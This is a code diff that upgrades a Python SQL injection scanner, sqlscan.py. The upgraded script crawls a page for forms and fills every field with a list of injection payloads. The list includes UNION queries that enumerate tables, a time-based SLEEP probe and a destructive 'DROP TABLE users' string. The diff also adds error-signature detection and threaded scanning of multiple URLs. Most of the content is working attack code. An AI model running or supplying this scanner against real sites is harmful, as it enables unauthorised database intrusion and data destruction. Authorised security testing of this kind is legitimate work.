@@ -3,122 +3,133 @@ from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 import sys
 import time
+import threading
 
-# List of common SQL injection payloads to test
+# Enhanced list of SQL injection payloads
 sql_payloads = [
     "' OR 1=1 --",
     "' OR 'a'='a",
-    '" OR "a"="a',
+    '" OR "a"="a"',
     "' UNION SELECT NULL, NULL, NULL --",
+    "' UNION SELECT table_name FROM information_schema.tables --",
     "' AND 1=1 --",
     "' AND 1=2 --",
     "' OR 1=1#",
-    '" OR 1=1 --",
+    "' OR SLEEP(5) --",
     "' OR 1=1/*",
-    '" OR "a"="a" --",
+    "'; DROP TABLE users --",
+    '" OR "a"="a" --',
+    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
 ]
 
-# Function to send HTTP requests (GET and POST)
-def send_request(url, data=None):
+# Common SQL error messages for detection
+sql_error_signatures = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "sqlstate[hy000]",
+    "microsoft odbc",
+    "syntax error",
+]
+
+# Function to send HTTP requests
+def send_request(url, data=None, headers=None):
     try:
         if data:
-            response = requests.post(url, data=data)
+            response = requests.post(url, data=data, headers=headers)
         else:
-            response = requests.get(url)
+            response = requests.get(url, headers=headers)
         return response
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
         return None
 
-# Function to check if the page contains a login form
-def find_login_form(url):
-    response = send_request(url)
+# Function to find forms on a page
+def find_forms(url, headers=None):
+    response = send_request(url, headers=headers)
     if response and response.status_code == 200:
         soup = BeautifulSoup(response.text, 'html.parser')
-
-        # Find all forms in the page
         forms = soup.find_all('form')
-        login_forms = []
-
-        for form in forms:
-            # Check if the form contains any input fields related to login (username and password)
-            inputs = form.find_all('input')
-            action = form.get('action', '')
-            method = form.get('method', 'get').lower()
-
-            # If the form contains inputs for username or password, consider it a login form
-            for input_tag in inputs:
-                name = input_tag.get('name', '').lower()
-                if 'user' in name or 'email' in name or 'login' in name or 'pass' in name:
-                    login_forms.append((form, action, method))
-                    break
-
-        return login_forms
+        return forms
     return []
 
-# Function to test for SQL injection on the login form
-def test_sql_injection(url, login_form, method):
-    action_url = login_form[1]
+# Function to test SQL injection on a form
+def test_form(url, form, method, headers=None):
+    action_url = form.get('action', '')
     if not action_url.startswith("http"):
         action_url = urljoin(url, action_url)
 
-    # Get the input fields
-    inputs = login_form[0].find_all('input')
-
-    # Prepare a basic data payload for testing SQL injection
-    payload = {}
+    # Extract form inputs
+    inputs = form.find_all('input')
+    data = {}
     for input_tag in inputs:
         name = input_tag.get('name', '')
-        if 'pass' in name.lower():
-            payload[name] = "' OR '1'='1"
-        elif 'user' in name.lower() or 'email' in name.lower():
-            payload[name] = "' OR '1'='1"
+        input_type = input_tag.get('type', 'text')
+        if input_type == 'hidden' or input_type == 'text':
+            data[name] = "' OR '1'='1"
+        elif input_type == 'password':
+            data[name] = "' OR '1'='1"
         else:
-            payload[name] = 'test'
+            data[name] = 'test'
 
-    # Testing each payload
-    for p in sql_payloads:
-        print(f"Testing with payload: {p}")
-        payload[name] = p  # Replace the payload in the relevant field
-        
-        if method == 'post':
-            response = send_request(action_url, data=payload)
-        else:
-            response = send_request(action_url)
+    for payload in sql_payloads:
+        for key in data.keys():
+            data[key] = payload
+            print(f"Testing with payload: {payload}")
+            if method == 'post':
+                response = send_request(action_url, data=data, headers=headers)
+            else:
+                response = send_request(action_url + "?" + "&".join([f"{k}={v}" for k, v in data.items()]), headers=headers)
 
-        if response and response.status_code == 200:
-            response_text = response.text
-            # Look for typical SQL error messages in the response
-            if 'error' in response_text.lower() or 'unclosed quotation mark' in response_text.lower():
-                print(f"Potential SQL Injection vulnerability detected in the login form!")
-                return True
-        time.sleep(1)  # To avoid rapid requests that might block you
-    
+            if response and response.status_code == 200:
+                for error_signature in sql_error_signatures:
+                    if error_signature in response.text.lower():
+                        print(f"[!] Potential SQL Injection vulnerability detected with payload: {payload}")
+                        return True
+            time.sleep(0.5)  # To avoid overwhelming the server
     return False
 
-# Main function to scan a URL for login forms and SQL injection
-def scan_url(url):
-    print(f"Scanning {url} for login forms and SQL Injection...")
-    login_forms = find_login_form(url)
+# Main function to scan a URL
+def scan_url(url, headers=None):
+    print(f"Scanning {url} for forms...")
+    forms = find_forms(url, headers=headers)
 
-    if login_forms:
-        print(f"Login form detected: {len(login_forms)} form(s) found. Trying SQL injection on each...")
-        for login_form in login_forms:
-            method = login_form[0].get('method', 'get').lower()
-            vulnerable = test_sql_injection(url, login_form, method)
+    if forms:
+        print(f"{len(forms)} form(s) detected. Testing for SQL Injection vulnerabilities...")
+        for form in forms:
+            method = form.get('method', 'get').lower()
+            vulnerable = test_form(url, form, method, headers=headers)
             if vulnerable:
+                print("[+] Vulnerability found and logged!")
                 break
     else:
-        print("No login form detected on this page.")
+        print("No forms detected on this page.")
+
+# Threaded scanning function
+def threaded_scan(urls, headers=None):
+    threads = []
+    for url in urls:
+        t = threading.Thread(target=scan_url, args=(url, headers))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
 
 # Main function to accept command-line arguments
 def main():
-    if len(sys.argv) != 3 or sys.argv[1] != '-u':
-        print("Usage: python sqlscan.py -u <url>")
+    if len(sys.argv) < 3 or sys.argv[1] != '-u':
+        print("Usage: python sqlscan.py -u <url> [optional: --headers 'User-Agent: ...']")
         sys.exit(1)
 
     url = sys.argv[2]
-    scan_url(url)
+    headers = None
+
+    if len(sys.argv) > 3 and sys.argv[3] == '--headers':
+        headers = {k: v for k, v in [h.split(": ") for h in sys.argv[4].split(",")]}
+    
+    scan_url(url, headers=headers)
 
 if __name__ == "__main__":
     main()
